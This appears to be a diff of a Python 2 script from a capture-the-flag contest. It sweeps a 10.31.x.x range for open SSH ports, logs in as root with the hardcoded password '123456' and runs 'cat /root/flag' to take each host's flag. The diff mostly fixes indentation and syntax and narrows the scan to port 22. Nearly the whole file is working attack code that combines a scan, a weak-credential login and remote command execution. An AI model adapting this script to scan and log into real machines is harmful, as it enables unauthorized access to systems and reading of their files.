@@ -1,9 +1,9 @@
-#/usr/bin/env python
-#-*- coding:utf-8 -*-
+#!/usr/bin/env python
+# -*- coding:UTF-8 -*-
 import socket
-for c in range (1,255,1):
-    ip = '10.31.151.' + str(c)
-    for port in range (1,80,1):
+for c in range(1,255,1):
+    ip = '10.31.'+ str(c) + '.101'
+    for port in range(22,23,1):
         sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sk.settimeout(0.01)
         print "scannin port: %d" % port
@@ -11,30 +11,27 @@ for c in range (1,255,1):
             sk.connect((ip,port))
             print 'Server %s port %d OK' % (ip,port)
             if port == 22:
-                print "Try to connect  " + str(ip)":22"
+                print "Try to connect " + str(ip)+":22"
                 import paramiko
-                def sshclient_execmd(hostname,port,username,password,execmd):
+                def sshclient_execmd(hostname, port, username, password, execmd):
                     paramiko.util.log_to_file("paramiko.log")
                     s = paramiko.SSHClient()
                     s.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-                    s.connect(hostname=hostname,port=port,username=username,password=password)
-                    stdin,stdout,stderr = s.exec_command(execmd)
+                    s.connect(hostname=hostname, port=port, username=username, password=password)
+                    stdin, stdout, stderr = s.exec_command(execmd)
                     stdin.write("Y")
                     print stdout.read()
                     s.close()
-                    def main():
-                        hostname = ip
-                        port = 22
-                        username = 'root'
-                        password = '123456'
-                        execmd = "cat /root/flag"
-                        sshclient_execmd(hostname,port,username,password,execmd)
-                    if _name_== "__main__":
-                        main()
-                    exit(0)
-            except Exception:
-                print 'Server %s port %d is not connected' % (ip,port)
-        sk.close()
-    c = c + 1
-                        
-                    
+                def main():
+                    hostname = ip
+                    port = 22
+                    username = 'root'
+                    password = '123456'
+                    execmd = "cat /root/flag"
+                    sshclient_execmd(hostname, port, username, password, execmd)
+                if __name__ == "__main__":
+                    main()
+        except Exception:
+            print 'Server %s port %d is not connected!' % (ip,port)
+    sk.close()
+c = c + 1
